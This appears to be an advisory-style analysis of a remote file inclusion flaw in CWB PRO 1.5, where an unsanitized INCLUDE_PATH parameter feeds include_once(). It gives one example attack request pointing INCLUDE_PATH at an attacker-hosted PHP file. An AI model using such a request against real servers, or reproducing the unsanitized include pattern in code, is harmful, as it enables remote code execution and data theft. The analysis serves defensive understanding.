Based on the provided content, here's a breakdown of the vulnerability:

**Root Cause:**
The vulnerability lies in the improper handling of the `INCLUDE_PATH` variable in multiple PHP files (`cls_headline_prod.php`, `cls_listorders.php`, `cls_viewpastorders.php`) of the CWB PRO 1.5 application. The application uses `include_once($INCLUDE_PATH."cls_products.php")`, and similar statements, to include files. The `INCLUDE_PATH` variable is directly taken from the request without proper sanitization, allowing an attacker to manipulate it.

**Weaknesses/Vulnerabilities Present:**
- **Remote File Inclusion (RFI):** The core vulnerability is RFI. By controlling the `INCLUDE_PATH` variable through the GET request, an attacker can force the application to include and execute a remote file, which can be a malicious script.
- **Lack of Input Sanitization:** The application fails to sanitize or validate the `INCLUDE_PATH` variable before using it in the `include_once()` function, leading to the vulnerability.

**Impact of Exploitation:**
- **Arbitrary Code Execution:** An attacker can inject and execute arbitrary code on the server by including a malicious PHP script from a remote location. This allows the attacker to potentially gain complete control of the compromised server.
- **Data Breach:** With code execution, the attacker can access and steal sensitive data, including user information, database credentials, and configuration files.
- **Website Defacement:** The attacker may modify the website or redirect users to malicious websites.
- **Denial of Service:** The attacker could disrupt the normal operation of the web server.

**Attack Vectors:**
- **HTTP GET Request:** The vulnerability is triggered by manipulating the `INCLUDE_PATH` parameter in the query string of a GET request.
   For example:
   `[Path]/include/cls_headline_prod.php?INCLUDE_PATH=http://attacker.com/malicious.php`

**Required Attacker Capabilities/Position:**
- **Network Access:** The attacker needs to have network access to the vulnerable server.
- **Basic HTTP Knowledge:** The attacker needs knowledge of crafting HTTP requests and manipulating query string parameters.
- **Remote Server:**  The attacker needs a publicly accessible server to host the malicious script.
